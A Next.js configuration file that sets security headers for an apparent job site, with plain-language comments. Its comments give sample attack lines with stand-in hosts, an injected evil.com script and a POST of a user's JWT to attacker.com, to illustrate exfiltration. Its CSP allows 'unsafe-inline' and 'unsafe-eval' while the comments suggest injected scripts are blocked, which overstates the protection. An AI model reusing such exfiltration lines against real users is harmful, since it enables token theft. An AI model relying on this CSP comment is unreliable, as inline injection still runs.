import type { NextConfig } from "next";

const securityHeaders = [
  {
    // Prevents site from being embedded in an <iframe> on another website.
    // Stops "clickjacking", where an attacker overlays your site invisibly inside
    // their page and tricks users into clicking buttons they can't see (e.g. "Delete Account").
    key: "X-Frame-Options",
    value: "DENY",
  },
  {
    // Tells the browser not to guess (sniff) the file type of a response.
    // Prevents an attacker from uploading a file named "resume.pdf" that is actually
    // a JavaScript file, then tricking the browser into executing it as a script.
    key: "X-Content-Type-Options",
    value: "nosniff",
  },
  {
    // Controls how much URL information is sent to other sites when a user clicks a link.
    // Example: if a user is on greenify.com/dashboard and clicks a job link,
    // the employer's site only sees "greenify.com" — not the full /dashboard path,
    // preventing internal URLs from leaking to third parties.
    key: "Referrer-Policy",
    value: "strict-origin-when-cross-origin",
  },
  {
    // Allows the browser to pre-resolve DNS for external links before the user clicks them,
    // making navigation feel faster. Safe performance optimization.
    key: "X-DNS-Prefetch-Control",
    value: "on",
  },
  {
    // Blocks the site from accessing device hardware features it doesn't need.
    // Prevents a compromised third-party script from silently turning on the user's
    // camera, microphone, or tracking their location without permission.
    key: "Permissions-Policy",
    value: "camera=(), microphone=(), geolocation=()",
  },
  {
    // Content Security Policy, the most powerful header. Tells the browser exactly
    // which sources are allowed to load each type of resource. If anything outside
    // this allowlist tries to run, the browser blocks it outright.
    key: "Content-Security-Policy",
    value: [
      // Any resource type not covered below must come from our own domain.
      // Prevents an XSS attack from loading resources from attacker-controlled servers.
      "default-src 'self'",

      // Scripts can only come from our own domain.
      // 'unsafe-inline' and 'unsafe-eval' are required by Next.js internals.
      // Without this, an injected <script src="https://evil.com/steal.js"> would be blocked.
      "script-src 'self' 'unsafe-inline' 'unsafe-eval'",

      // Styles can come from our domain or Google Fonts.
      // Prevents an attacker from injecting styles that visually spoof our UI
      // (e.g. fake login overlays).
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",

      // Font files can only load from our domain or Google Fonts CDN.
      "font-src 'self' https://fonts.gstatic.com",

      // Images can come from our domain, inline data URIs, blobs, or any HTTPS source.
      // Allows job company logos and external images to load safely over HTTPS.
      "img-src 'self' data: blob: https:",

      // API/fetch/WebSocket calls can only go to our domain or Supabase.
      // Prevents a malicious script from silently exfiltrating user data to
      // an attacker's server (e.g. POST https://attacker.com/steal with your JWT).
      "connect-src 'self' https://*.supabase.co wss://*.supabase.co",

      // Redundant with X-Frame-Options above but specified in CSP as well for
      // broader browser support. Belt-and-suspenders against clickjacking.
      "frame-ancestors 'none'",
    ].join("; "),
  },
];

const nextConfig: NextConfig = {
  devIndicators: false,
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: securityHeaders,
      },
    ];
  },
};

export default nextConfig;
